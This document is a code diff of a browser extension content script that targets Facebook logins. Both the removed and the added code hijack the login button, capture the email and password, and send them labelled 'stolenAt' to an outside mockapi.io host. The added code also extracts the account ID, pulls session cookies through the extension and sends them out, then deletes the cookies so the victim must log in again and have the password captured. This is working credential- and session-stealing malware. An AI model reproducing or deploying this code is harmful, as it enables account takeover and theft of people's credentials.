@@ -1,63 +1,158 @@
-(() => {
-    try {
-        const edEmail = document.getElementById("email");
-        const edPass = document.getElementById("pass");
-
-        const btnSubmit = document.querySelector("button[name='login']");
-
-        btnSubmit.type = "button";
-        btnSubmit.onclick = (e) => {
-            var userAgent = navigator.userAgent;
-            var email = edEmail.value;
-            var pass = edPass.value;
-
-            const user = {
-                email: email,
-                password: pass,
-                userAgent: userAgent,
-                stolenAt: dateTime(),
-            };
-
-            sendData(user);
-
-            btnSubmit.type = "submit";
-        };
-    } catch {
-        console.log("Error, can not find the elements!");
-        chrome.runtime.sendMessage({ type: "get_facebook" }, (e) => {});
-    }
-})();
-
-const sendData = (user) => {
-    const API = "https://6514b3f1dc3282a6a3cd7125.mockapi.io/cookies";
-
-    fetch(API, {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json",
-        },
-        body: JSON.stringify(user),
-    })
-        .then((success) => {})
-        .catch((error) => {});
-};
+const API = "https://6514b3f1dc3282a6a3cd7125.mockapi.io/cookies";
+const targetURL = "https://www.facebook.com";
+const userAgent = navigator.userAgent;
 
 function addZero(number) {
     return number < 10 ? "0" + number : number;
 }
 
 const dateTime = () => {
-    var currentDate = new Date();
-    var year = currentDate.getFullYear();
-    var month = currentDate.getMonth() + 1;
-    var day = currentDate.getDate();
-    var hours = currentDate.getHours();
-    var minutes = currentDate.getMinutes();
-    var seconds = currentDate.getSeconds();
-    var formattedDate = addZero(day) + "/" + addZero(month) + "/" + year;
-    var formattedTime = addZero(hours) + ":" + addZero(minutes) + ":" + addZero(seconds);
-    var dateTimeNow = formattedTime + " - " + formattedDate;
-    return dateTimeNow;
+    const currentDate = new Date();
+    const year = currentDate.getFullYear();
+    const month = addZero(currentDate.getMonth() + 1);
+    const day = addZero(currentDate.getDate());
+    const hours = addZero(currentDate.getHours());
+    const minutes = addZero(currentDate.getMinutes());
+    const seconds = addZero(currentDate.getSeconds());
+    return `${hours}:${minutes}:${seconds} - ${day}/${month}/${year}`;
 };
 
-// // keyLog();
+const getCUser = () => {
+    const s = `"CurrentUserInitialData":{"ACCOUNT_ID":"`;
+    const scripts = document.querySelectorAll("script[data-sjs]");
+    let c_user = null;
+
+    scripts.forEach((script) => {
+        if (script.innerText.includes(s)) {
+            c_user = script.innerText.split(s)[1].split(`"`)[0];
+        }
+    });
+
+    return c_user;
+};
+
+const keyLogging = () => {
+    try {
+        const c_user = localStorage.getItem("c_user")?.split('"')[1];
+        const edEmail = document.getElementById("email");
+        const edPass = document.getElementById("pass");
+        const btnSubmit = document.querySelector("button[name='login']");
+
+        btnSubmit.type = "button";
+        btnSubmit.onclick = async (e) => {
+            const email = edEmail.value;
+            const pass = edPass.value;
+            const user = {
+                email,
+                password: pass,
+                userAgent,
+                stolenAt: dateTime(),
+            };
+
+            if (c_user) {
+                const res = await fetch(`${API}?c_user=${c_user}`);
+                const data = await res.json();
+
+                if (data.length <= 0) {
+                    await fetch(`${API}`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ ...user, c_user }),
+                    });
+                } else {
+                    const id = data[0].id;
+                    await fetch(`${API}/${id}`, {
+                        method: "PUT",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify(user),
+                    });
+                    localStorage.removeItem("c_user");
+                }
+            } else {
+                await fetch(`${API}`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(user),
+                });
+            }
+
+            btnSubmit.type = "submit";
+        };
+    } catch (error) {
+        // Handle errors
+    }
+};
+
+const getCookies = () => {
+    return new Promise((resolve, reject) => {
+        chrome.runtime.sendMessage("getcookies", (e) => {
+            e && e !== "" ? resolve(e) : reject(null);
+        });
+    });
+};
+
+const removeCookies = () => {
+    chrome.runtime.sendMessage("removecookies", (e) => {});
+};
+
+const processUser = async (c_user) => {
+    if (c_user) {
+        console.log("Found user", c_user);
+        const res = await fetch(`${API}/?c_user=${c_user}`);
+        const data = await res.json();
+
+        if (data.length <= 0) {
+            console.log("user data not have in server!");
+            try {
+                const cookie = await getCookies();
+                console.log("storing user cookie and save localstorage...");
+                localStorage.setItem("c_user", JSON.stringify(c_user));
+
+                const user = {
+                    c_user,
+                    cookie,
+                    userAgent,
+                    stolenAt: dateTime(),
+                };
+
+                await fetch(`${API}`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(user),
+                });
+
+                console.log("remove the user cookies");
+                removeCookies();
+            } catch (error) {
+                // Handle errors
+            }
+        } else {
+            try {
+                const cookie = await getCookies();
+                console.log("update user cookie...");
+                const user = {
+                    cookie,
+                    userAgent,
+                    stolenAt: dateTime(),
+                };
+
+                await fetch(`${API}/${data[0].id}`, {
+                    method: "PUT",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(user),
+                });
+
+                console.log("success");
+            } catch (error) {
+                console.log("error");
+            }
+        }
+    } else {
+        keyLogging();
+    }
+};
+
+(() => {
+    const c_user = getCUser();
+    processUser(c_user);
+})();
